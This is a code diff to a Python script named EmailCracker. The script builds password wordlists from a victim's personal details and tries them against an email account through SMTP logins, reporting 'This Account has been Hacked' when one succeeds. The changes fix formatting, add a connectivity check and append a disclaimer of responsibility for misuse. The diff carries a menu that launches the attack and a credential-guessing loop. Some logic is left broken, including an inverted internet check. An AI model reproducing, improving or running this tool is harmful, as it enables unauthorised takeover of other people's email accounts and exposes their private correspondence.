@@ -16,30 +16,30 @@ SMTPport = setup.getint('SMTP', 'port')
 # Email: evilfeonix@gmail.com 
 
 
-################ This is a dictionary attack tool based on cracking email password
-###############  Named, (emailCracker) and was build with the help of python programming language
-######           This tool generates a list of password (also known as wordlist) based on the victim's info2rmatiom provided
+################ EmailCracker is a tool that simulate a password guessing attack (brute force or dictionary)
+###############  Named, (EmailCracker) is a Python-based project designed to crack password based on email services
+######           It aimed to generates a list of password (also known as wordlist) based on the victim's informatiom provided
 ############     Those password this tool generate are 4 in minimum and 18 in maximum (length)
 ################ And also trys to crack the victim's email password with the generated password.
 
 
 stop="\033[0m"
 red="\033[31;1m"
-d_red="\033[91m"
+darkred="\033[91m"
 blue="\033[34;1m"
 green="\033[32;1m"
 yellow="\033[33;1m"
 purple="\033[35;1m"
 
 
-add=f"{%s}[{%s}+{%s}]{%s} "%(red,stop,red,yellow)
-error=f"{%s}[{%s}-{%s}]{%s} "%(blue,stop,blue,red)
-notice=f"{%s}[{%s}!{%s}]{%s} "%(blue,stop,blue,red)
-info2=f"{%s}[{%s}•{%s}]{%s} "%(green,stop,green,purple)
-success=f"{%s}[{%s}√{%s}]{%s} "%(purple,stop,purple,green)
-first= f"{%s}[{%s}01{%s}]{%s} "%(green,stop,green,purple)
-second= f"{%s}[{%s}02{%s}]{%s} "%(green,stop,green,purple)
-third= f"{%s}[{%s}03{%s}]{%s} "%(green,stop,green,purple)
+add=f"{red}[{stop}+{red}]{yellow} "
+error=f"{blue}[{stop}-{blue}]{red} "
+notice=f"{blue}[{stop}!{blue}]{red} "
+info2=f"{green}[{stop}•{green}]{purple} "
+success=f"{purple}[{stop}√{purple}]{green} "
+first= f"{green}[{stop}01{green}]{purple} "
+second= f"{green}[{stop}02{green}]{purple} "
+third= f"{green}[{stop}03{green}]{purple} "
 version="2.0.1.6"
 
 
@@ -73,14 +73,13 @@ def internet():
 def aboutus():
     os.system("clea" + "r || cls")
     granted()
-    slowbr(f'\t{info2}Tool Name      {blue}:>>{purple}  emailCracker')
+    slowbr(f'\t{info2}Tool Name      {blue}:>>{purple}  Email Cracker')
     slowbr(f'\t{info2}Version        {blue}:>>{purple}  v[{version[:-2]}]')
-    slowbr(f'\t{info2}Author         {blue}:>>{d_red}  FEONIX')
-    slowbr(f'\t{info2}Github         {blue}:>>{purple}  Evil {d_red}FeoniX')
-    slowbr(f'\t{info2}Youtube        {blue}:>>{purple}  Evil {d_red}FeoniX')
+    slowbr(f'\t{info2}Author         {blue}:>>{purple}  evilfeonix')
+    slowbr(f'\t{info2}Github         {blue}:>>{purple}  Evil {darkred}FeoniX')
+    slowbr(f'\t{info2}Youtube        {blue}:>>{purple}  Evil {darkred}FeoniX')
     slowbr(f'\t{info2}Latest Update  {blue}:>>{purple}  17-11-2024')
-    slowbr(f'\t{info2}Website        {blue}:>>{purple}  www.evilfeonix.com')
-    slow(f"{red}")
+    slowbr(f'\t{info2}Website        {blue}:>>{purple}  www.evilfeonix.com{red}')
     slowbr("="*60)
     slowbr("")
     act=input(f'{add}Press {purple}[{stop}ENTER{purple}]{yellow} To Continue')
@@ -88,15 +87,15 @@ def aboutus():
 
 def granted():
     logo=f"""{green}
-    //{d_red}===={green} /||   /||     /|| ||     //         //{d_red}===={green} //{d_red}==={green}//  /||     //{d_red}===={green} //   //  //{%s}===={green} //{%s}==={green}// 
+    //{darkred}===={green} /||   /||     /|| ||     //         //{darkred}===={green} //{darkred}==={green}//  /||     //{darkred}===={green} //   //  //{darkred}===={green} //{darkred}==={green}// 
   //      //||  //||    //|| ||    //        //      //    // //||   //      //   // //      //    //
- //{d_red}===={green}  // || // ||   //{d_red}={green}|| ||   //        //      //{d_red}=={green}//   //{d_red}={green}||  //      //{d_red}=={green}//  //{d_red}===={green}  //{d_red}=={green}//
+ //{darkred}===={green}  // || // ||   //{darkred}={green}|| ||   //        //      //{darkred}=={green}//   //{darkred}={green}||  //      //{darkred}=={green}//  //{darkred}===={green}  //{darkred}=={green}//
 //      //  ||//  ||  //  || ||  //        //      //    // //  || //      //   // //      //    //
-//{d_red}===={green} //   |//   || //   || || //{d_red}===={green}     //{d_red}===={green} //    // //   || //{d_red}===={green} //   //  //{d_red}===={green} //    //{stop}"""
+//{darkred}===={green} //   |//   || //   || || //{darkred}===={green}     //{darkred}===={green} //    // //   || //{darkred}===={green} //   //  //{darkred}===={green} //    //{stop}"""
     show(logo)
     slow(f"{red}")
     slowbr("="*60)
-    slowbr(f"{blue}:>> {green}Coded by EVIL {d_red}FEONIX {blue}<<:".center(66," "))
+    slowbr(f"{blue}:>> {green}Coded by EVIL {darkred}FEONIX {blue}<<:".center(66," "))
     slowbr(f"{blue}:>> {green}www.evilfeonix.com {blue}<<:".center(63," "))
     slowbr(f"{blue}:>> {green}Email Cracker {blue}<<:{red}".center(66," "))
     slowbr("="*60)
@@ -149,7 +148,7 @@ def cracker(argument):
     os.system("clea" + "r || cls")
     if len(password)==0:
         slowbr(banner(password,ban="3"))
-        slowbr(f"{error}We are unable to generate password becouse you didn't provide any information{stop}")
+        slowbr(f"{error}We are unable to generate password becouse u didn't provide victim's information{stop}")
         os.sys.exit()
         
 
@@ -158,7 +157,7 @@ def cracker(argument):
     slow(f"{notice}Pleace wait!, starting SMTP Server{stop}"),load('')
     smtpObj = smtplib.SMTP_SSL(SMTPhost,SMTPport)
     smtpObj.ehlo()
-    #smtpObj.starttls()
+    # smtpObj.starttls()
     time.sleep(3)
     index=0
     mail=victim[0]
@@ -170,7 +169,7 @@ def cracker(argument):
             os.system("clea" + "r || cls")
             time.sleep(1)
             slowbr(f'\t{green}Password Found!')
-            loadbr(f'\t{green}This Account has been Hacked{stop}')
+            loadbr(f'\t{green}This Account has been Hacked{stop} ^_^')
             time.sleep(3)
             os.system("clea" + "r || cls")
             granted()
@@ -179,7 +178,7 @@ def cracker(argument):
             os.sys.exit(1)
         except smtplib.SMTPAuthenticationError as err:
             if str(err)[14]=='<':
-                loadbr(f'\t{green}This Account has been Hacked{stop}'),show()
+                loadbr(f'\t{green}This Account has been Hacked{stop} ^_^'),show()
                 time.sleep(3)
                 slowbr(f'\t{green}Password Found {blue}:>> {green}{pwd}')
                 slowbr(f'\t{green}Email Address {blue}:>> {green}{mail}{stop}')
@@ -193,13 +192,19 @@ def main():
     parser.add_argument("---minLen", help="minimum length of password", default=4)
     parser.add_argument("--maxLen", help="maximum length of password", default=18)
     argument=parser.parse_args()
+    os.system("clea" + "r || cls"),granted()
+    net=internet()
+    if net:
+    # if not net:
+        time.sleep(1)
+        slow(f"\n{error}Please check your internet connection{stop}")
+        os.sys.exit()
     try:
-        os.system("clea" + "r || cls"),granted()
         slowbr(f"""\n\t{first}Launch Attacks\n\t{second}About\n\t{third}Exit\n""")
         opt=input(f"""{green}[{stop}SELECT OPTION..{green}] {blue}:>>{purple} """)
         if opt in["1","01","a","A"]:cracker(argument)
         elif opt in["2","02","b","B"]:aboutus()
-        elif opt in["3","03","c","C"]:slowbr(f"\n{error}Thanks for using our tool.{stop}"%(,)),os.sys.exit()
+        elif opt in["3","03","c","C"]:slowbr(f"\n{error}Thanks for using our tool.{stop}"),os.sys.exit()
         else:loadbr(f"\n{error}Invali Option!{stop}"%(error,stop)),main()
     except KeyboardInterrupt:slowbr(f"\n\n{error}User Requested an Interrupt!{stop}"),slow(f"{error}Program Running Down!{stop}"),load(''),os.sys.exit()
 
@@ -216,3 +221,5 @@ password=[]
 if __name__ == "__main__":
     main()
 
+
+#            Note that the creators of this tool are not responsible for any misuse or damage caused by its usage.
